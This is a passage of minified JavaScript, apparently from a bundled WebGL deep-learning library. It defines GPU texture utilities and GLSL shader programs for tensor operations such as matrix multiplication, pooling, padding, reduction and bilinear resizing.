s=c(t,o);a.validateTextureSize(t,n,r),a.callAndCheck(t,(function(){return t.bindTexture(t.TEXTURE_2D,e)})),a.callAndCheck(t,(function(){return t.texSubImage2D(t.TEXTURE_2D,0,0,0,n,r,s,l(t),i)})),a.callAndCheck(t,(function(){return t.bindTexture(t.TEXTURE_2D,null)}))}function d(t,e,n){return o.ENV.get("WEBGL_FLOAT_TEXTURE_ENABLED")?new Float32Array(s.getUnpackedArraySizeFromMatrixSize(t*e,n)):new Uint8Array(t*e*n)}function f(t,e,n,r){if(o.ENV.get("WEBGL_FLOAT_TEXTURE_ENABLED")){var i=new Float32Array(e*n);return s.decodeMatrixFromUnpackedArray(t,i,r),i}return s.decodeToFloatArray(t)}n.getWebGLContextAttributes=u,n.createWebGLContext=function(t){var e,n={alpha:!1,antialias:!1,premultipliedAlpha:!1,preserveDrawingBuffer:!1,depth:!1,stencil:!1,failIfMajorPerformanceCaveat:!0};return e=null!=t?a.createWebGLRenderingContextFromCanvas(t,n):a.createWebGLRenderingContext(n),a.callAndCheck(e,(function(){return e.disable(e.DEPTH_TEST)})),a.callAndCheck(e,(function(){return e.disable(e.STENCIL_TEST)})),a.callAndCheck(e,(function(){return e.disable(e.BLEND)})),a.callAndCheck(e,(function(){return e.disable(e.DITHER)})),a.callAndCheck(e,(function(){return e.disable(e.POLYGON_OFFSET_FILL)})),a.callAndCheck(e,(function(){return e.disable(e.SAMPLE_COVERAGE)})),a.callAndCheck(e,(function(){return e.enable(e.SCISSOR_TEST)})),a.callAndCheck(e,(function(){return e.enable(e.CULL_FACE)})),a.callAndCheck(e,(function(){return e.cullFace(e.BACK)})),e},n.createVertexShader=function(t){return a.createVertexShader(t,"\n    precision highp float;\n    attribute vec3 clipSpacePos;\n    attribute vec2 uv;\n    varying vec2 resultUV;\n\n    void main() {\n      gl_Position = vec4(clipSpacePos, 1);\n      resultUV = uv;\n    }")},n.createVertexBuffer=function(t){var e=new Float32Array([-1,1,0,0,1,-1,-1,0,0,0,1,1,0,1,1,1,-1,0,1,0]);return a.createStaticVertexBuffer(t,e)},n.createIndexBuffer=function(t){var e=new Uint16Array([0,1,2,2,1,3]);return a.createStaticIndexBuffer(t,e)},n.createMatrixTexture=function(t,e,n){var r=s.getUnpackedMatrixTextureShapeWidthHeight(e,n);return h(t,r[0],r[1],1)},n.createColorMatrixTexture=function(t,e,n){var r=s.getColorMatrixTextureShapeWidthHeight(e,n);return h(t,r[0],r[1],4)},n.createPackedMatrixTexture=function(t,e,n){var r=s.getPackedMatrixTextureShapeWidthHeight(e,n);return h(t,r[0],r[1],4)},n.bindVertexProgramAttributeStreams=function(t,e,n){a.callAndCheck(t,(function(){return t.bindBuffer(t.ARRAY_BUFFER,n)})),a.bindVertexBufferToProgramAttribute(t,e,"clipSpacePos",n,3,20,0),a.bindVertexBufferToProgramAttribute(t,e,"uv",n,2,20,12)},n.uploadPixelDataToTexture=function(t,e,n){a.callAndCheck(t,(function(){return t.bindTexture(t.TEXTURE_2D,e)})),a.callAndCheck(t,(function(){return t.texImage2D(t.TEXTURE_2D,0,t.RGBA,t.RGBA,t.UNSIGNED_BYTE,n)})),a.callAndCheck(t,(function(){return t.bindTexture(t.TEXTURE_2D,null)}))},n.uploadMatrixToTexture=function(t,e,n,r,i,u){var c,l=s.getUnpackedMatrixTextureShapeWidthHeight(n,r),h=l[0],d=l[1];if(o.ENV.get("WEBGL_FLOAT_TEXTURE_ENABLED")){var f=1===u?a.getChannelsPerTexture():u;1===f?c=i:(c=new Float32Array(s.getUnpackedArraySizeFromMatrixSize(i.length,f)),s.encodeMatrixToUnpackedArray(i,c,f))}else c=s.encodeFloatArray(i);p(t,e,h,d,c,u)},n.uploadMatrixToPackedTexture=function(t,e,n,r,i){var o=s.getPackedMatrixTextureShapeWidthHeight(n,r),a=o[0],u=o[1],c=new Float32Array(s.getPackedRGBAArraySizeFromMatrixShape(n,r));s.encodeMatrixToPackedRGBA(i,n,r,c),p(t,e,a,u,c,4)},n.downloadMatrixFromOutputTextureAsync=function(t,e,n,o){return r(this,void 0,void 0,(function(){var r,s,u,c,h;return i(this,(function(i){switch(i.label){case 0:return r=t,u=d(n,o,s=4),c=u instanceof Float32Array?4*u.length:u,h=t.createBuffer(),a.callAndCheck(t,(function(){return t.bindBuffer(r.PIXEL_PACK_BUFFER,h)})),a.callAndCheck(t,(function(){return t.bufferData(r.PIXEL_PACK_BUFFER,c,t.STATIC_DRAW)})),a.callAndCheck(t,(function(){return r.readPixels(0,0,o,n,t.RGBA,l(t),0)})),[4,e.getBufferSubDataAsync(r.PIXEL_PACK_BUFFER,0,u)];case 1:return i.sent(),[2,f(u,n,o,s)]}}))}))},n.downloadMatrixFromOutputTexture=function(t,e,n){var r=s.getUnpackedMatrixTextureShapeWidthHeight(e,n),i=r[0],o=r[1],u=d(e,n,4);return a.callAndCheck(t,(function(){return t.readPixels(0,0,i,o,t.RGBA,l(t),u)})),f(u,e,n,4)},n.downloadMatrixFromRGBAColorTexture=function(t,e,n,r){var i=e*n*4,o=new Uint8Array(i);a.callAndCheck(t,(function(){return t.readPixels(0,0,n,e,t.RGBA,t.UNSIGNED_BYTE,o)}));for(var u=new Float32Array(i),c=0;c<o.length;c++)u[c]=o[c];var l=new Float32Array(e*n*r);return s.decodeMatrixFromUnpackedColorRGBAArray(u,l,r),l},n.downloadMatrixFromPackedOutputTexture=function(t,e,n){var r=s.getPackedMatrixTextureShapeWidthHeight(e,n),i=r[0],o=r[1],u=new Float32Array(s.getPackedRGBAArraySizeFromMatrixShape(e,n));a.callAndCheck(t,(function(){return t.readPixels(0,0,i,o,t.RGBA,l(t),u)}));var c=new Float32Array(e*n);return s.decodeMatrixFromPackedRGBA(u,e,n,c)}},{"../../environment":27,"./tex_util":90,"./webgl_util":95}],77:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./shader_compiler"),i=function(t,e,n){var i,o;if(this.variableNames=["c","a","b"],this.outputShape=e,n>4)throw Error("Where for rank "+n+" is not yet supported");if(1===n)o="resRC",i="resRC";else{for(var s=["resRC.x","resRC.y","resRC.z","resRC.w"],a=[],u=[],c=0;c<e.length;c++)u.push(""+s[c]),c<t&&a.push(""+s[c]);i=a.join(),o=u.join()}var l=r.getCoordsDataType(n);this.userCode="\n      void main() {\n        "+l+" resRC = getOutputCoords();\n        float cVal = getC("+i+");\n        if (cVal >= 1.0) {\n          setOutput(getA("+o+"));\n        } else {\n          setOutput(getB("+o+"));\n        }\n      }\n    "};n.WhereProgram=i},{"./shader_compiler":88}],78:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=function(t,e,n,r,i,o){this.variableNames=["x"],this.outputShape=[];var s,a=e,u=t[1]-1,c=t[2]-1,l=t[3]-1;this.outputShape=t;var h="float("+n+") + float("+r+") * sum";s=.5===i?"inversesqrt("+h+")":1===i?"1.0/("+h+")":"exp(log("+h+") * float(-"+i+"));",this.userCode="withinChannel"===o?"\n        void main() {\n          ivec4 coords = getOutputCoords();\n          int b = coords[0];\n          int r = coords[1];\n          int c = coords[2];\n          int d = coords[3];\n          float x = getX(b, r, c, d);\n          float sum = 0.0;\n          for (int u = -"+a+"; u <= "+a+"; u++) {\n            for (int v = -"+a+"; v <= "+a+"; v++) {\n              int idx = r + u;\n              int idy = c + v;\n              if (idx >= 0 && idx <= "+u+" && idy >= 0 && idy <= "+c+") {\n                float z = getX(b, idx, idy, d);\n                sum += z * z;\n              }\n            }\n          }\n          float val = x * "+s+";\n          setOutput(val);\n        }\n      ":"\n        void main() {\n          ivec4 coords = getOutputCoords();\n          int b = coords[0];\n          int r = coords[1];\n          int c = coords[2];\n          int d = coords[3];\n          float x = getX(b, r, c, d);\n          float sum = 0.0;\n          for (int j = -"+a+"; j <= "+a+"; j++) {\n            int idx = d + j;\n            if (idx >= 0 && idx <=  "+l+") {\n              float z = getX(b, r, c, idx);\n              sum += z * z;\n            }\n          }\n          float val = x * "+s+";\n          setOutput(val);\n        }\n      "};n.LRNProgram=r},{}],79:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=function(t){this.variableNames=["dy","maxPos"],this.outputShape=t.inShape;var e=t.filterHeight,n=t.filterWidth,r=t.strideHeight,i=t.strideWidth,o=e-1-t.padInfo.top,s=n-1-t.padInfo.left,a=e*n-1;this.userCode="\n      const ivec2 pads = ivec2("+o+", "+s+");\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int b = coords[0];\n        int d = coords[3];\n\n        ivec2 dyRCCorner = coords.yz - pads;\n        int dyRCorner = dyRCCorner.x;\n        int dyCCorner = dyRCCorner.y;\n\n        // Convolve dy(?, ?, d) with pos mask(:, :, d) to get dx(xR, xC, d).\n        // ? = to be determined. : = across all values in that axis.\n        float dotProd = 0.0;\n        for (int wR = 0; wR < "+e+"; wR++) {\n          float dyR = float(dyRCorner + wR) / "+r+".0;\n\n          if (dyR < 0.0 || dyR >= "+t.outHeight+".0 || fract(dyR) > 0.0) {\n            continue;\n          }\n          int idyR = int(dyR);\n\n          for (int wC = 0; wC < "+n+"; wC++) {\n            float dyC = float(dyCCorner + wC) / "+i+".0;\n\n            if (dyC < 0.0 || dyC >= "+t.outWidth+".0 ||\n                fract(dyC) > 0.0) {\n              continue;\n            }\n            int idyC = int(dyC);\n\n            float dyValue = getDy(b, idyR, idyC, d);\n            int maxPosValue = "+a+" - int(getMaxPos(b, idyR, idyC, d));\n\n            // Get the current value, check it against the value from the\n            // position matrix.\n            int curPosValue = wR * "+n+" + wC;\n            float mask = float(maxPosValue == curPosValue ? 1.0 : 0.0);\n\n            dotProd += dyValue * mask;\n          }\n        }\n        setOutput(dotProd);\n      }\n    "};n.MaxPool2DBackpropProgram=r},{}],80:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=function(t,e,n,r){void 0===n&&(n=!1),void 0===r&&(r=!1),this.variableNames=["matrixA","matrixB"];var i=n?t[1]:t[0],o=r?e[0]:e[1],s=n?t[0]:t[1];this.outputShape=[i,o];var a=function(t,e){return n?e+" + "+t+", aRow":"aRow, "+e+" + "+t},u=function(t,e){return r?"bCol, "+e+" + "+t:e+" + "+t+", bCol"},c=4*Math.floor(s/4),l=s%4;this.userCode=" float dotARowBCol(int aRow, int bCol) {\n      float result = 0.0;\n      for (int i = 0; i < "+c+"; i += 4) {\n        vec4 a = vec4(\n          getMatrixA("+a(0,"i")+"),\n          getMatrixA("+a(1,"i")+"),\n          getMatrixA("+a(2,"i")+"),\n          getMatrixA("+a(3,"i")+")\n        );\n        vec4 b = vec4(\n          getMatrixB("+u(0,"i")+"),\n          getMatrixB("+u(1,"i")+"),\n          getMatrixB("+u(2,"i")+"),\n          getMatrixB("+u(3,"i")+")\n        );\n\n        result += dot(a, b);\n      }\n\n      if ("+(1===l)+") {\n        result += getMatrixA("+a(0,c)+") *\n          getMatrixB("+u(0,c)+");\n      } else if ("+(2===l)+") {\n        vec2 a = vec2(\n          getMatrixA("+a(0,c)+"),\n          getMatrixA("+a(1,c)+")\n        );\n        vec2 b = vec2(\n          getMatrixB("+u(0,c)+"),\n          getMatrixB("+u(1,c)+")\n        );\n        result += dot(a, b);\n      } else if ("+(3===l)+") {\n        vec3 a = vec3(\n          getMatrixA("+a(0,c)+"),\n          getMatrixA("+a(1,c)+"),\n          getMatrixA("+a(2,c)+")\n        );\n        vec3 b = vec3(\n          getMatrixB("+u(0,c)+"),\n          getMatrixB("+u(1,c)+"),\n          getMatrixB("+u(2,c)+")\n        );\n        result += dot(a, b);\n      }\n\n      return result;\n    }\n\n    void main() {\n      ivec2 resRC = getOutputCoords();\n      setOutput(dotARowBCol(resRC.x, resRC.y));\n    }\n    "};n.MatMulProgram=r},{}],81:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=function(){function t(t,e,n){this.variableNames=["probs"],this.outputShape=[t,n],this.userCode="\n      uniform float seed;\n\n      void main() {\n        ivec2 coords = getOutputCoords();\n        int batch = coords[0];\n\n        float r = random(seed);\n        float cdf = 0.0;\n\n        for (int i = 0; i < "+(e-1)+"; i++) {\n          cdf += getProbs(batch, i);\n\n          if (r < cdf) {\n            setOutput(float(i));\n            return;\n          }\n        }\n\n        // If no other event happened, last event happened.\n        setOutput(float("+(e-1)+"));\n      }\n    "}return t.prototype.getCustomSetupFunc=function(t){var e=this;return function(n,r){null==e.seedLoc&&(e.seedLoc=n.getUniformLocation(r,"seed")),n.gl.uniform1f(e.seedLoc,t)}},t}();n.MultinomialProgram=r},{}],82:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=function(t,e,n,r){this.variableNames=["indices"],this.outputShape=[t,e],this.userCode="\n      void main() {\n        ivec2 coords = getOutputCoords();\n        int index = round(getIndices(coords.x));\n        setOutput(mix(float("+r+"), float("+n+"),\n                      float(index == coords.y)));\n      }\n    "};n.OneHotProgram=r},{}],83:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./shader_compiler"),i=function(t,e,n){this.variableNames=["x"],this.outputShape=e.map((function(e,n){return e[0]+t[n]+e[1]}));var i=t.length,o=r.getCoordsDataType(i),s=e.map((function(t){return t[0]})).join(","),a=e.map((function(e,n){return e[0]+t[n]})).join(","),u=["coords[0]","coords[1]","coords[2]","coords[3]"].slice(0,i);this.userCode=1!==i?"\n      "+o+" start = "+o+"("+s+");\n      "+o+" end = "+o+"("+a+");\n\n      void main() {\n        "+o+" outC = getOutputCoords();\n        if (any(lessThan(outC, start)) || any(greaterThanEqual(outC, end))) {\n          setOutput(float("+n+"));\n        } else {\n          "+o+" coords = outC - start;\n          setOutput(getX("+u+"));\n        }\n      }\n    ":"\n        int start = "+s+";\n        int end = "+a+";\n\n        void main() {\n          int outC = getOutputCoords();\n          if (outC < start || outC >= end) {\n            setOutput(float("+n+"));\n          } else {\n            setOutput(getX(outC - start));\n          }\n        }\n      "};n.PadProgram=i},{"./shader_compiler":88}],84:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=function(t,e,n){if(this.variableNames=["x"],"avg"===e&&n)throw new Error("Cannot compute positions for average pool.");var r=t.filterHeight,i=t.filterWidth,o=t.strideHeight,s=t.strideWidth,a=t.padInfo.top,u=t.padInfo.left;this.outputShape=t.outShape;var c="avg"===e,l="0.0";if(c||(l="min"===e?"1.0 / 0.0":"-1.0 / 0.0"),n){var h="min"===e?"<=":">=";this.userCode="\n        const ivec2 strides = ivec2("+o+", "+s+");\n        const ivec2 pads = ivec2("+a+", "+u+");\n\n        void main() {\n          ivec4 coords = getOutputCoords();\n          int batch = coords[0];\n          int d = coords[3];\n\n          ivec2 xRCCorner = coords.yz * strides - pads;\n          int xRCorner = xRCCorner.x;\n          int xCCorner = xRCCorner.y;\n\n          // max/min x(?, ?, d) to get y(yR, yC, d).\n          // ? = to be determined\n          float minMaxValue = 0.0;\n          float minMaxValueFound = 0.0;\n          int minMaxPosition = 0;\n          float avgValue = 0.0;\n\n          for (int wR = 0; wR < "+r+"; wR++) {\n            int xR = xRCorner + wR;\n\n            if (xR < 0 || xR >= "+t.inHeight+") {\n              continue;\n            }\n\n            for (int wC = 0; wC < "+i+"; wC++) {\n              int xC = xCCorner + wC;\n\n              if (xC < 0 || xC >= "+t.inWidth+") {\n                continue;\n              }\n\n              float value = getX(batch, xR, xC, d);\n\n              if (isNaN(value)) {\n                setOutput(value);\n                return;\n              }\n\n              // If a min / max value has already been found, use it. If not,\n              // use the current value.\n              float currMinMaxValue = mix(\n                  value, minMaxValue, minMaxValueFound);\n              if (value "+h+" currMinMaxValue) {\n                minMaxValue = value;\n                minMaxValueFound = 1.0;\n                minMaxPosition = wR * "+i+" + wC;\n              }\n            }\n          }\n          setOutput(float(minMaxPosition));\n        }\n      "}else{var p="min"===e?"min":"max",d=e+"("+e+"("+e+"(minMaxValue[0], minMaxValue[1]), minMaxValue[2]), minMaxValue[3])";"avg"===e&&(d="avgValue / "+r*i+".0");var f=4*Math.floor(i/4),y=i%4,m="\n      if (hasNaN(values)) {\n        setOutput(getNaN(values));\n        return;\n      }\n      if ("+c+") {\n        avgValue += dot(values, ones);\n      } else {\n        minMaxValue = "+p+"(values, minMaxValue);\n      }\n    ";this.userCode="\n      const ivec2 strides = ivec2("+o+", "+s+");\n      const ivec2 pads = ivec2("+a+", "+u+");\n      const float initializationValue = "+l+";\n      const vec4 ones = vec4(1.0, 1.0, 1.0, 1.0);\n\n      float getValue(int batch, int xR, int xC, int d) {\n        if (xC < 0 || xC >= "+t.inWidth+") {\n          return initializationValue;\n        }\n        return getX(batch, xR, xC, d);\n      }\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int batch = coords[0];\n        int d = coords[3];\n\n        ivec2 xRCCorner = coords.yz * strides - pads;\n        int xRCorner = xRCCorner.x;\n        int xCCorner = xRCCorner.y;\n\n        // max/min x(?, ?, d) to get y(yR, yC, d).\n        // ? = to be determined\n        vec4 minMaxValue = vec4("+l+");\n        float avgValue = 0.0;\n\n        for (int wR = 0; wR < "+r+"; wR++) {\n          int xR = xRCorner + wR;\n\n          if (xR < 0 || xR >= "+t.inHeight+") {\n            continue;\n          }\n\n          for (int wC = 0; wC < "+f+"; wC += 4) {\n            int xC = xCCorner + wC;\n\n            vec4 values = vec4(\n              getValue(batch, xR, xC, d),\n              getValue(batch, xR, xC + 1, d),\n              getValue(batch, xR, xC + 2, d),\n              getValue(batch, xR, xC + 3, d)\n            );\n\n            "+m+"\n          }\n\n          int xC = xCCorner + "+f+";\n          if ("+(1===y)+") {\n            vec4 values = vec4(\n              getValue(batch, xR, xC, d),\n              initializationValue,\n              initializationValue,\n              initializationValue\n            );\n            "+m+"\n          } else if ("+(2===y)+") {\n            vec4 values = vec4(\n              getValue(batch, xR, xC, d),\n              getValue(batch, xR, xC + 1, d),\n              initializationValue,\n              initializationValue\n            );\n\n            "+m+"\n          } else if ("+(3===y)+") {\n            vec4 values = vec4(\n              getValue(batch, xR, xC, d),\n              getValue(batch, xR, xC + 1, d),\n              getValue(batch, xR, xC + 2, d),\n              initializationValue\n            );\n\n            "+m+"\n          }\n        }\n        setOutput("+d+");\n      }\n    "}};n.Pool2DProgram=r},{}],85:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=function(t,e){this.variableNames=["x"];var n=t.windowSize,r=t.batchSize,i=t.inSize,o=Math.ceil(i/n);this.outputShape=[r,o];var s="sum"===e,a="0.0";s||(a="min"===e?"1.0 / 0.0":"-1.0 / 0.0");var u="min"===e?"min":"max",c=e+"("+e+"("+e+"(minMaxValue[0], minMaxValue[1]), minMaxValue[2]), minMaxValue[3])";"sum"===e&&(c="sumValue");var l=4*Math.floor(n/4),h=n%4,p="\n      if ("+s+") {\n        sumValue += dot(values, ones);\n      } else {\n        if (hasNaN(values)) {\n          setOutput(getNaN(values));\n          return;\n        }\n        minMaxValue = "+u+"(values, minMaxValue);\n      }\n    ",d="";i%n>0&&(d="\n        if (inIdx < 0 || inIdx >= "+i+") {\n          return initializationValue;\n        }\n      "),this.userCode="\n      const float initializationValue = "+a+";\n      const vec4 ones = vec4(1.0, 1.0, 1.0, 1.0);\n\n      float getValue(int batch, int inIdx) {\n        "+d+"\n        return getX(batch, inIdx);\n      }\n\n      void main() {\n        ivec2 coords = getOutputCoords();\n        int batch = coords[0];\n        int outIdx = coords[1];\n        int inOffset = outIdx * "+n+";\n\n        vec4 minMaxValue = vec4("+a+");\n        float sumValue = 0.0;\n\n        for (int i = 0; i < "+l+"; i += 4) {\n          int inIdx = inOffset + i;\n          vec4 values = vec4(\n            getValue(batch, inIdx),\n            getValue(batch, inIdx + 1),\n            getValue(batch, inIdx + 2),\n            getValue(batch, inIdx + 3)\n          );\n\n          "+p+"\n        }\n\n        int inIdx = inOffset + "+l+";\n        if ("+(1===h)+") {\n          vec4 values = vec4(\n            getValue(batch, inIdx),\n            initializationValue,\n            initializationValue,\n            initializationValue\n          );\n          "+p+"\n        } else if ("+(2===h)+") {\n          vec4 values = vec4(\n            getValue(batch, inIdx),\n            getValue(batch, inIdx + 1),\n            initializationValue,\n            initializationValue\n          );\n          "+p+"\n        } else if ("+(3===h)+") {\n          vec4 values = vec4(\n            getValue(batch, inIdx),\n            getValue(batch, inIdx + 1),\n            getValue(batch, inIdx + 2),\n            initializationValue\n          );\n          "+p+"\n        }\n        setOutput("+c+");\n      }\n    "};n.ReduceProgram=r},{}],86:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=function(t,e,n,r){this.variableNames=["A"],this.outputShape=[];var i=t[0],o=t[1],s=t[2],a=t[3];this.outputShape=[i,e,n,a];var u=r?[o-1,s-1]:[o,s],c=r?[e-1,n-1]:[e,n];this.userCode="\n      const vec2 effectiveInputOverOutputRatioRC = vec2(\n          "+u[0]/c[0]+",\n          "+u[1]/c[1]+");\n      const vec2 inputShapeRC = vec2("+o+".0, "+s+".0);\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int b = coords[0];\n        int d = coords[3];\n        ivec2 yRC = coords.yz;\n\n        // Fractional source index.\n        vec2 sourceFracIndexRC = vec2(yRC) * effectiveInputOverOutputRatioRC;\n\n        // Compute the four integer indices.\n        ivec2 sourceFloorRC = ivec2(sourceFracIndexRC);\n        ivec2 sourceCeilRC = ivec2(\n          min(inputShapeRC - 1.0, ceil(sourceFracIndexRC)));\n\n        float topLeft = getA(b, sourceFloorRC.x, sourceFloorRC.y, d);\n        float bottomLeft = getA(b, sourceCeilRC.x, sourceFloorRC.y, d);\n        float topRight = getA(b, sourceFloorRC.x, sourceCeilRC.y, d);\n        float bottomRight = getA(b, sourceCeilRC.x, sourceCeilRC.y, d);\n\n        vec2 fracRC = sourceFracIndexRC - vec2(sourceFloorRC);\n\n        float top = topLeft + (topRight - topLeft) * fracRC.y;\n        float bottom = bottomLeft + (bottomRight - bottomLeft) * fracRC.y;\n        float newValue = top + (bottom - top) * fracRC.x;\n\n        setOutput(newValue);\n      }\n    "};n.ResizeBilinearProgram=r},{}],87:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./shader_compiler"),i=function(t,e){this.variableNames=["x"];var n=t.length;if(n>4)throw new Error("WebGL backend: Reverse of rank-"+n+" tensor is not yet supported");if(this.outputShape=t,1!==n){var i=t.map((function(n,r){return function(n){return-1!==e.indexOf(n)&&1!==t[n]?t[n]+" - coords["+n+"] - 1":"coords["+n+"]"}(r)})).join(","),o=r.getCoordsDataType(n);this.userCode="\n      void main() {\n        "+o+" coords = getOutputCoords();\n        setOutput(getX("+i+"));\n      }\n    "}else this.userCode="\n        void main() {\n          int coord = getOutputCoords();\n          setOutput(getX("+t[0]+" - coord - 1));\n        }\n      "};n.ReverseProgram=i},{"./shader_compiler":88}],88:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("../../environment"),i=t("../../util"),o=t("../../ops/broadcast_util"),s=t("./tex_util");function a(t){var e,n=t.shapeInfo.logicalShape;switch(n.length){case 0:return"\n    float get"+(e=t.name).charAt(0).toUpperCase()+e.slice(1)+"() {\n      return sample("+e+", halfCR);\n    }\n  ";case 1:return function(t){var e=t.name,n="get"+e.charAt(0).toUpperCase()+e.slice(1);return"\n    float "+n+"(int index) {\n      return "+n+"Flat(index);\n    }\n  "}(t);case 2:return function(t){var e=t.shapeInfo.logicalShape,n=t.shapeInfo.texShape,r=t.name,o="get"+r.charAt(0).toUpperCase()+r.slice(1),s=n[0],u=n[1];if(i.arraysEqual(e,n))return"\n    float "+o+"(int row, int col) {\n      vec2 uv = (vec2(col, row) + halfCR) / vec2("+u+".0, "+s+".0);\n      return sample("+r+", uv);\n    }\n  ";var c=i.squeezeShape(e),l=c.newShape,h=c.keptDims,p=l;if(p.length<e.length){var y=["row","col"];return"\n      "+a(d(t,p))+"\n      float "+o+"(int row, int col) {\n        return "+o+"("+f(y,h)+");\n      }\n    "}if(1===u)return"\n    float "+o+"(int row, int col) {\n      int index = row * "+e[1]+" + col;\n      vec2 uv = vec2(0.5, (float(index) + 0.5) / "+s+".0);\n      return sample("+r+", uv);\n    }\n  ";if(1===s)return"\n    float "+o+"(int row, int col) {\n      int index = row * "+e[1]+" + col;\n      vec2 uv = vec2((float(index) + 0.5) / "+u+".0, 0.5);\n      return sample("+r+", uv);\n    }\n  ";return"\n  float "+o+"(int row, int col) {\n    vec2 uv = UVfrom2D("+s+", "+u+", "+e[1]+", row, col);\n    return sample("+r+", uv);\n  }\n"}(t);case 3:return function(t){var e=t.shapeInfo.texShape,n=t.shapeInfo.logicalShape,r=t.name,o="get"+r.charAt(0).toUpperCase()+r.slice(1),s=e[0],u=e[1],c=n[1]*n[2],l=n[2],h=i.squeezeShape(n),p=h.newShape,y=h.keptDims,m=p;if(m.length<n.length){var v=["row","col","depth"];return"\n        "+a(d(t,m))+"\n        float "+o+"(int row, int col, int depth) {\n          return "+o+"("+f(v,y)+");\n        }\n      "}if(u===c)return"\n        float "+o+"(int row, int col, int depth) {\n          int texR = row;\n          int texC = col * "+l+" + depth;\n          vec2 uv = (vec2(texC, texR) + halfCR) /\n                     vec2("+u+".0, "+s+".0);\n          return sample("+r+", uv);\n        }\n      ";if(u===l)return"\n    float "+o+"(int row, int col, int depth) {\n      int texR = row * "+n[1]+" + col;\n      int texC = depth;\n      vec2 uv = (vec2(texC, texR) + halfCR) / vec2("+u+".0, "+s+".0);\n      return sample("+r+", uv);\n    }\n  ";return"\n      float "+o+"(int row, int col, int depth) {\n        vec2 uv = UVfrom3D(\n            "+s+", "+u+", "+c+", "+l+", row, col, depth);\n        return sample("+r+", uv);\n      }\n  "}(t);case 4:return function(t){var e=t.shapeInfo.logicalShape,n=t.shapeInfo.texShape,r=t.name,o="get"+r.charAt(0).toUpperCase()+r.slice(1),s=n[0],u=n[1],c=e[3],l=e[2]*c,h=e[1]*l,p=i.squeezeShape(e),y=p.newShape,m=p.keptDims;if(y.length<e.length){var v=["row","col","depth","depth2"];return"\n      "+a(d(t,y))+"\n      float "+o+"(int row, int col, int depth, int depth2) {\n        return "+o+"("+f(v,m)+");\n      }\n    "}if(u===h)return"\n      float "+o+"(int row, int col, int depth, int depth2) {\n        int texR = row;\n        int texC = col * "+l+" + depth * "+c+" + depth2;\n        vec2 uv = (vec2(texC, texR) + halfCR) /\n                   vec2("+u+".0, "+s+".0);\n        return sample("+r+", uv);\n      }\n    ";if(u===c)return"\n      float "+o+"(int row, int col, int depth, int depth2) {\n        int texR = row * "+e[1]*e[2]+" + col * "+e[2]+" + depth;\n        int texC = depth2;\n        vec2 uv = (vec2(texC, texR) + halfCR) /\n                  vec2("+u+".0, "+s+".0);\n        return sample("+r+", uv);\n      }\n    ";return"\n    float "+o+"(int row, int col, int depth, int depth2) {\n      vec2 uv = UVfrom4D("+s+", "+u+", "+h+", "+l+",\n          "+c+", row, col, depth, depth2);\n      return sample("+r+", uv);\n    }\n  "}(t);default:throw new Error(n.length+"-D input sampling is not yet supported")}}n.makeShader=function(t,e,n,s){var d=r.ENV.get("WEBGL_FLOAT_TEXTURE_ENABLED")?l:u,f=r.ENV.get("WEBGL_FLOAT_TEXTURE_ENABLED")?h:c,y=t.map((function(t){return"uniform sampler2D "+t.name+";"})).join("\n"),m=t.map((function(t){return function(t,e,n){var r=function(t){var e=t.name,n=t.shapeInfo.texShape,r="get"+e.charAt(0).toUpperCase()+e.slice(1)+"Flat",i=n[0],o=n[1];if(1===o&&1===i)return"\n      float "+r+"(int index) {\n        return sample("+e+", halfCR);\n      }\n    ";if(1===o)return"\n      float "+r+"(int index) {\n        vec2 uv = vec2(0.5, (float(index) + 0.5) / "+i+".0);\n        return sample("+e+", uv);\n      }\n    ";if(1===i)return"\n      float "+r+"(int index) {\n        vec2 uv = vec2((float(index) + 0.5) / "+o+".0, 0.5);\n        return sample("+e+", uv);\n      }\n    ";return"\n    float "+r+"(int index) {\n      vec2 uv = UVfrom1D("+i+", "+o+", index);\n      return sample("+e+", uv);\n    }\n  "}(t);r+=a(t),(n||i.arraysEqual(t.shapeInfo.logicalShape,e.logicalShape))&&(r+=function(t,e,n){var r=t.shapeInfo.texShape,s=t.name,a=s.charAt(0).toUpperCase()+s.slice(1),u="get"+a+"AtOutCoords",c=o.getBroadcastDims(t.shapeInfo.logicalShape,e.logicalShape),l=t.shapeInfo.logicalShape.length,h=e.logicalShape.length,p=n&&(h>l||c.length>0),d=o.broadcastDimsAreOuter(c);if(p&&!d)return function(t,e,n,r){var i=t.shapeInfo.logicalShape.length,s=e.logicalShape.length,a="int";2===s?a="ivec2":3===s?a="ivec3":4===s&&(a="ivec4");var u,c=o.getBroadcastDims(t.shapeInfo.logicalShape,e.logicalShape),l=s-i;u=0===i?"":s<2&&c.length>=1?"coords = 0;":c.map((function(t){return"coords["+(t+l)+"] = 0;"})).join("\n");var h="";h=s<2&&i>0?"coords":t.shapeInfo.logicalShape.map((function(t,e){return"coords["+(e+l)+"]"})).join(", ");return"\n    float "+r+"() {\n      "+a+" coords = getOutputCoords();\n      "+u+"\n      return get"+n+"("+h+");\n    }\n  "}(t,e,a,u);var f=e.texShape;if(i.arraysEqual(r,f))return"\n      float "+u+"() {\n        return sample("+s+", resultUV);\n      }\n    ";var y=i.sizeFromShape(r),m="";p&&d&&(m="\n        int mainPart = index / "+y+";\n        index -= mainPart * "+y+";\n      ");return"\n    float "+u+"() {\n      ivec2 resTexRC = ivec2(resultUV.yx *\n                             vec2("+f[0]+", "+f[1]+"));\n      int index = resTexRC.x * "+f[1]+" + resTexRC.y;\n      "+m+"\n      int texR = index / "+r[1]+";\n      int texC = index - texR * "+r[1]+";\n      vec2 uv = (vec2(texC, texR) + 